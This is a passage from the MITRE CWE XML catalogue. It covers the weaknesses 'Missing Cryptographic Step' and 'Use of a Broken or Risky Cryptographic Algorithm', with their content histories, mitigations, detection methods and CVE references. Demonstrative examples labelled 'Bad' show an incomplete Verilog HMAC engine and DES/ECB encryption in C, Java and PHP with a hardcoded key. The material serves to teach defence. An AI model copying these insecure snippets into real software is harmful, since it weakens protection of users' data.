               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-01-23</Modification_Date>
               <Modification_Comment>updated Abstraction </Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Maintenance_Notes, Modes_of_Introduction, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Description, Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>Accellera IP Security Assurance (IPSA) Working Group</Contribution_Name>
	       <Contribution_Organization>Accellera Systems Initiative</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Submitted original contents of CWE-1324 and reviewed its integration into this entry.</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2009-01-12">Plaintext Transmission of Sensitive Information</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="325" Name="Missing Cryptographic Step" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not implement a required step in a cryptographic algorithm, resulting in weaker encryption than advertised by the algorithm.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="358" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>Developers sometimes omit "expensive" (resource-intensive) steps in order to improve performance, especially in devices with limited memory or slower CPUs. This step may be taken under a mistaken impression that the step is unnecessary for the cryptographic algorithm.
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Requirements</Phase>
               <Note>This issue may happen when the requirements for the cryptographic algorithm are not clearly stated.
               </Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The example code is taken from the HMAC engine inside the buggy OpenPiton SoC of HACK@DAC'21 [REF-1358]. HAMC is a message authentication code (MAC) that uses both a hash and a secret crypto key. The HMAC engine in HACK@DAC SoC uses the SHA-256 module for the calculation of the HMAC for 512 bits messages.  </Intro_Text>
               <Example_Code Nature="Bad" Language="Verilog">
               <xhtml:b>logic [511:0] bigData;</xhtml:b><xhtml:br/>
               ...<xhtml:br/>
               <xhtml:br/>
               hmac hmac(<xhtml:br/>
                  <xhtml:div style="margin-left:1em;">
                  .clk_i(clk_i),<xhtml:br/>
                  .rst_ni(rst_ni &amp;&amp; ~rst_4),<xhtml:br/>
                  .init_i(startHash &amp;&amp; ~startHash_r),<xhtml:br/>
                  .key_i(key),<xhtml:br/>
                  .ikey_hash_i(ikey_hash), <xhtml:br/>
                  .okey_hash_i(okey_hash), <xhtml:br/>
                  .key_hash_bypass_i(key_hash_bypass),<xhtml:br/>
                  <xhtml:b>.message_i(bigData),</xhtml:b><xhtml:br/>
                  .hash_o(hash),<xhtml:br/>
                  .ready_o(ready),<xhtml:br/>
                  .hash_valid_o(hashValid)<xhtml:br/>
                  </xhtml:div>
               </Example_Code>
			   <Body_Text>However, this HMAC engine cannot handle messages that are longer than 512 bits. Moreover, a complete HMAC will contain an iterate hash function that breaks up a message into blocks of a fixed size and iterates over them with a compression function (e.g., SHA-256). Therefore, the implementation of the HMAC in OpenPiton SoC is incomplete. Such HMAC engines will not be used in real-world applications as the messages will usually be longer than 512 bits. For instance, OpenTitan offers a comprehensive HMAC implementation that utilizes a FIFO for temporarily storing the truncated message, as detailed in [REF-1359].</Body_Text>
               <Body_Text>To mitigate this, implement the iterative function to break up a message into blocks of a fixed size.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1585</Reference>
               <Description>Missing challenge-response step allows authentication bypass using public key.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1585</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Cryptography</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Missing Required Cryptographic Step</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Cryptographic Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A9</Entry_ID>
               <Entry_Name>Insecure Communications</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="68"/>
         </Related_Attack_Patterns>
         <References>
				<Reference External_Reference_ID="REF-1358"/>
            <Reference External_Reference_ID="REF-1359"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">Overlaps incomplete/missing security check.</Note>
            <Note Type="Relationship">Can be resultant.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Functional_Areas, Modes_of_Introduction, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description, Modes_of_Introduction, Name</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
				</Modification>
				<Contribution Type="Content">
					<Contribution_Name>Chen Chen, Rahul Kande, Jeyavijayan Rajendran</Contribution_Name>
					<Contribution_Organization>Texas A&amp;M University</Contribution_Organization>
					<Contribution_Date>2023-06-21</Contribution_Date>
					<Contribution_Comment>suggested demonstrative example</Contribution_Comment>
				</Contribution>
				<Contribution Type="Content">
					<Contribution_Name>Shaza Zeitouni, Mohamadreza Rostami, Ahmad-Reza Sadeghi</Contribution_Name>
					<Contribution_Organization>Technical University of Darmstadt</Contribution_Organization>
					<Contribution_Date>2023-06-21</Contribution_Date>
					<Contribution_Comment>suggested demonstrative example</Contribution_Comment>
				</Contribution>
			<Previous_Entry_Name Date="2020-08-20">Missing Required Cryptographic Step</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="327" Name="Use of a Broken or Risky Cryptographic Algorithm" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product uses a broken or risky cryptographic algorithm or protocol.</Description>
         <Extended_Description>
	   <xhtml:p>Cryptographic algorithms are the methods by which data is scrambled to prevent observation or influence by unauthorized actors. Insecure cryptography can be exploited to expose sensitive information, modify data in unexpected ways, spoof identities of other users or devices, or other impacts.</xhtml:p>
           <xhtml:p>It is very difficult to produce a secure algorithm, and even high-profile algorithms by accomplished cryptographic experts have been broken. Well-known techniques exist to break or weaken various kinds of cryptography. Accordingly, there are a small number of well-understood and heavily studied algorithms that should be used by most products. Using a non-standard or known-insecure algorithm is dangerous because a determined adversary may be able to break the algorithm and compromise whatever data has been protected.</xhtml:p>
           <xhtml:p>Since the state of cryptography advances so rapidly, it is common for an algorithm to be considered "unsafe" even if it was once thought to be strong. This can happen when new attacks are discovered, or if computing power increases so much that the cryptographic algorithm no longer provides the amount of protection that was originally thought.</xhtml:p>
	   <xhtml:p>For a number of reasons, this weakness is even more challenging to manage with hardware deployment of cryptographic algorithms as opposed to software implementation. First, if a flaw is discovered with hardware-implemented cryptography, the flaw cannot be fixed in most cases without a recall of the product, because hardware is not easily replaceable like software. Second, because the hardware product is expected to work for years, the adversary's computing power will only increase over time.</xhtml:p>
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="311" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
           <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	   <Language Name="Verilog" Prevalence="Undetermined"/>
           <Language Name="VHDL" Prevalence="Undetermined"/>
           <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
	   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>With hardware, the Architecture or Design Phase might start with compliant cryptography, but it is replaced with a non-compliant crypto during the later Implementation phase due to implementation constraints (e.g., not enough entropy to make it function properly, or not enough silicon real estate available to implement). Or, in rare cases (especially for long projects that span over years), the Architecture specifications might start with cryptography that was originally compliant at the time the Architectural specs were written, but over the time it became non-compliant due to progress made in attacking the crypto.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>The confidentiality of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>The integrity of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm.</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>If the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Analysis</Method>
               <Description>Automated methods may be useful for recognizing commonly-used libraries or features that have become obsolete.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>False negatives may occur if the tool is not aware of the cryptographic libraries in use, or if custom cryptography is being used.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Analysis</Method>
               <Description>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary / Bytecode simple extractor - strings, ELF readers, etc.</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Man-in-the-middle attack tool</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Automated Monitored Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-24">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.</xhtml:p>
                  <xhtml:p>For example, US government systems require FIPS 140-2 certification [REF-1192].</xhtml:p>
                  <xhtml:p>Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.</xhtml:p>
                  <xhtml:p>Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]</xhtml:p>
               </Description>
            </Mitigation>
        <Mitigation Mitigation_ID="MIT-52">
          <Phase>Architecture and Design</Phase>
          <Description>Ensure that the design allows one cryptographic algorithm to be replaced with another in the next generation or version. Where possible, use wrappers to make the interfaces uniform. This will make it easier to upgrade to stronger algorithms. With hardware, design the product at the Intellectual Property (IP) level so that one cryptographic algorithm can be replaced with another in the next generation of the hardware product.</Description>
	  <Effectiveness>Defense in Depth</Effectiveness>
        </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Carefully manage and protect cryptographic keys (see CWE-320). If the keys can be guessed or stolen, then the strength of the cryptography itself is irrelevant.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Industry-standard implementations will save development time and may be more likely to avoid errors that can occur during implementation of cryptographic algorithms. Consider the ESAPI Encryption feature.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>These code examples use the Data Encryption Standard (DES).</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>EVP_des_ecb();</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cipher des=Cipher.getInstance("DES...");<xhtml:br/>des.initEncrypt(key2);</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function encryptPassword($password){<xhtml:div style="margin-left:1em;">$iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB);<xhtml:br/>$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);<xhtml:br/>$key = "This is a password encryption key";<xhtml:br/>$encryptedPassword = mcrypt_encrypt(MCRYPT_DES, $key, $password, MCRYPT_MODE_ECB, $iv);<xhtml:br/>return $encryptedPassword;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Once considered a strong algorithm, DES now regarded as insufficient for many applications. It has been replaced by Advanced Encryption Standard (AES).</Body_Text>
            </Demonstrative_Example>
	    <Demonstrative_Example>
	      <Intro_Text>Suppose a chip manufacturer decides to implement a hashing scheme for verifying integrity property of certain bitstream, and it chooses to implement a SHA1 hardware accelerator for to implement the scheme.</Intro_Text>
	      <Example_Code Nature="Bad" Language="Other">
		<xhtml:div>The manufacturer chooses a SHA1 hardware accelerator for to implement the scheme because it already has a working SHA1 Intellectual Property (IP) that the manufacturer had created and used earlier, so this reuse of IP saves design cost.</xhtml:div>
	      </Example_Code>
	      <Body_Text>However, SHA1 was theoretically broken in 2005 and practically broken in 2017 at a cost of $110K. This means an attacker with access to cloud-rented computing power will now be able to provide a malicious bitstream with the same hash value, thereby defeating the purpose for which the hash was used.</Body_Text>
	      <Body_Text>This issue could have been avoided with better design.</Body_Text>
	      <Example_Code Nature="Good" Language="Other">
		<xhtml:div>The manufacturer could have chosen a cryptographic solution that is recommended by the wide security community (including standard-setting bodies like NIST) and is not expected to be broken (or even better, weakened) within the reasonable life expectancy of the hardware product. In this case, the architects could have used SHA-2 or SHA-3, even if it meant that such choice would cost extra.</xhtml:div>
	      </Example_Code>
	    </Demonstrative_Example>
		<Demonstrative_Example Demonstrative_Example_ID="DX-153">
			<Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
			<Body_Text>Multiple OT products used weak cryptography.</Body_Text>
		 </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-30273</Reference>
               <Description>SCADA-based protocol supports a legacy encryption mode that uses Tiny Encryption Algorithm (TEA) in ECB mode, which leaks patterns in messages and cannot protect integrity</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30273</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30320</Reference>
               <Description>Programmable Logic Controller (PLC) uses a protocol with a cryptographically insecure hashing algorithm for passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30320</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3775</Reference>
               <Description>Product uses "ROT-25" to obfuscate the password in the registry.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3775</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4150</Reference>
               <Description>product only uses "XOR" to obfuscate sensitive data</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4150</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5460</Reference>
               <Description>product only uses "XOR" and a fixed key to obfuscate sensitive data</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5460</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4860</Reference>
